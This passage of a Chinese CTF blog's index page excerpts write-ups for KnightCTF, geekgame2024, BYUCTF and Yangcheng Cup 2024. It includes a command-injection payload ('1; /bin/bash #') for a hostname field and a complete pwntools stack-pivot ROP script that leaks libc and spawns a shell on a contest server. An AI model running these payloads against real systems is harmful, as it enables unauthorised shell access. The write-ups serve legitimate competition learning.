        <span class="token function">win_prize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error: You cannot withdraw more than 1,000,000 at a time."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid input. Exiting."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">win_prize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulations! You win the prize!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
	
	</div>
  <a type="button" href="/2025/01/27/KnightCTF/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/10/23/geekgame2024/" >geekgame2024</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-10-23  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了了喵，不懂dev 不懂algo</p>
<p>总排名 #68，校外排名 #22，差四十分就能拿到三等奖了还是太菜了</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>啊这，看起来像是压缩包套娃，随便点了几下就找到flag了</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;W3LCOME-TO-THE-GUTSY-GUSHY-GEEKGAME&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="清北问答"><a href="#清北问答" class="headerlink" title="清北问答"></a>清北问答</h2><p>flag1</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;jailbreak-master-unleashed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag2</p>
	
	</div>
  <a type="button" href="/2024/10/23/geekgame2024/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/09/07/byuctf-iot/" >byuctf_iot</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-09-07  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="iot"><a href="#iot" class="headerlink" title="iot"></a>iot</h1><p>We found a command injection….. but you have to reboot the router to activate it…</p>
<h2 id="Reboot-Misc"><a href="#Reboot-Misc" class="headerlink" title="Reboot(Misc)"></a>Reboot(Misc)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">### IMPORTS ###</span>
<span class="token keyword">import</span> os<span class="token punctuation">,</span> time<span class="token punctuation">,</span> sys


<span class="token comment">### INPUT ###</span>
hostname <span class="token operator">=</span> <span class="token string">'bababooey'</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'=== MENU ==='</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1. Set hostname'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'2. Reboot'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        hostname <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Enter new hostname (30 chars max): '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">]</span>

    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Rebooting..."</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cat /etc/hosts | grep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string"> -i'</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Reboot complete'</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Invalid choice'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>命令注入？ 查询了一下shell相关的文档，发现可以通过 ;去连接两条子命令，# 去注释掉 -i</p>
<p>exp</p>
<pre class="line-numbers language-none"><code class="language-none">1; &#x2F;bin&#x2F;bash #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Sal-HardWare"><a href="#Sal-HardWare" class="headerlink" title="Sal(HardWare)"></a>Sal(HardWare)</h2><pre class="line-numbers language-none"><code class="language-none">A few friends and I recently hacked into a consumer-grade home router. Our first goal was to obtain the firmware. To do that, we hooked up a SOIC-8 clip to the external flash memory chip, connected a Saleae Logic Pro 8 logic analyzer, and captured data using Logic 2 as we booted up the IoT device. The external flash memory chip was Winbond 25Q128JVSQ.

What&#39;s the md5sum of &#x2F;etc&#x2F;passwd?

Flag format - byuctf&#123;hash&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>external flash memory chip(外部存储芯片) 一般用来存数据(文件系统)，需要分析Saleae逻辑分析仪捕获的信号，来还原这个文件系统</p>
	
	</div>
  <a type="button" href="/2024/09/07/byuctf-iot/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/09/04/羊城杯2024pwn/" >羊城杯2024pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-09-04  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn">https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn</a></p>
<h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"139.155.126.78"</span>
PORT <span class="token operator">=</span> <span class="token number">32922</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

rdi<span class="token operator">=</span><span class="token number">0x0000000000400773</span>
rbp<span class="token operator">=</span><span class="token number">0x00000000004005b0</span>
leave_ret<span class="token operator">=</span><span class="token number">0x4006DB</span>
ret<span class="token operator">=</span><span class="token number">0x4006DC</span>
vuln<span class="token operator">=</span><span class="token number">0x4006C4</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x601730</span><span class="token punctuation">,</span>vuln
<span class="token punctuation">]</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Can you grasp this little bit of overflow?"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    rdi<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    rbp<span class="token punctuation">,</span><span class="token number">0x601a30</span><span class="token punctuation">,</span>vuln<span class="token punctuation">,</span>
    <span class="token number">0x6016f8</span><span class="token punctuation">,</span>leave_ret
<span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">,</span>
    <span class="token number">0x6019f8</span><span class="token punctuation">,</span>leave_ret
<span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> bad sp value at call has been detected<span class="token punctuation">,</span> the output may be wrong!
<span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> v3<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> result<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v6<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v7<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  struct tm <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  __time_t tv_sec<span class="token punctuation">;</span> <span class="token operator">//</span> edi
  <span class="token builtin">int</span> st_size<span class="token punctuation">;</span> <span class="token operator">//</span> esi
  const char <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  struct dirent <span class="token operator">**</span>namelist<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14134h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v13<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14130h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v14<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1412Ch<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v15<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>14h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14128h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v16<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14124h<span class="token punctuation">]</span> BYREF
  char v17<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14120h<span class="token punctuation">]</span> BYREF
  char <span class="token operator">*</span>haystack<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1411Ch<span class="token punctuation">]</span>
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>24h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14118h<span class="token punctuation">]</span>
  size_t v20<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14114h<span class="token punctuation">]</span>
  char <span class="token operator">*</span>has_host<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14110h<span class="token punctuation">]</span>
  char <span class="token operator">*</span>v22<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>30h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1410Ch<span class="token punctuation">]</span>
  <span class="token builtin">int</span> stdout_fd<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>34h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14108h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v24<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14104h<span class="token punctuation">]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>3Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14100h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v26<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>40h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140FCh<span class="token punctuation">]</span>
  FILE <span class="token operator">*</span>v27<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>44h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F8h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> c<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>48h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F4h<span class="token punctuation">]</span>
  struct stat v29<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>4Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F0h<span class="token punctuation">]</span> BYREF
  char modes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A6h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14096h<span class="token punctuation">]</span> BYREF
  char v31<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14094h<span class="token punctuation">]</span> BYREF
  char v32<span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>B8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14084h<span class="token punctuation">]</span> BYREF
  char v33<span class="token punctuation">[</span><span class="token number">1908</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14010h<span class="token punctuation">]</span> BYREF
  char input_data<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>8A0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1389Ch<span class="token punctuation">]</span> BYREF
  char httpMethod<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2FB0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1118Ch<span class="token punctuation">]</span> BYREF
  char requestPath<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>56C0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>EA7Ch<span class="token punctuation">]</span> BYREF
  char v37<span class="token punctuation">[</span><span class="token number">9999</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>56C1h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>EA7Bh<span class="token punctuation">]</span> BYREF
  char httpVersion<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>7DD0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>C36Ch<span class="token punctuation">]</span> BYREF
  char <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token number">20000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A4E0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>9C5Ch<span class="token punctuation">]</span> BYREF
  char v40<span class="token punctuation">[</span><span class="token number">15588</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>F300h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>4E3Ch<span class="token punctuation">]</span> BYREF
  __int64 v41<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12FE4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1158h<span class="token punctuation">]</span>
  char <span class="token operator">*</span>v42<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12FECh<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1150h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v43<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1312Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1010h<span class="token punctuation">]</span> BYREF
  unsigned <span class="token builtin">int</span> v44<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>14120h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span>
  <span class="token builtin">int</span> <span class="token operator">*</span>p_argc<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1412Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>10h<span class="token punctuation">]</span>

  p_argc <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>v43 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>v33 <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
  v44 <span class="token operator">=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  memset<span class="token punctuation">(</span><span class="token operator">&amp;</span>v33<span class="token punctuation">[</span><span class="token number">884</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v20 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  strcpy<span class="token punctuation">(</span>modes<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> chdir<span class="token punctuation">(</span><span class="token string">"/home/ctf/html"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Internal Error"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Config error - couldn't chdir()."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"No request found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> __isoc99_sscanf<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"%[^ ] %[^ ] %[^ ]"</span><span class="token punctuation">,</span> httpMethod<span class="token punctuation">,</span> <span class="token operator">&amp;</span>requestPath<span class="token punctuation">,</span> httpVersion<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
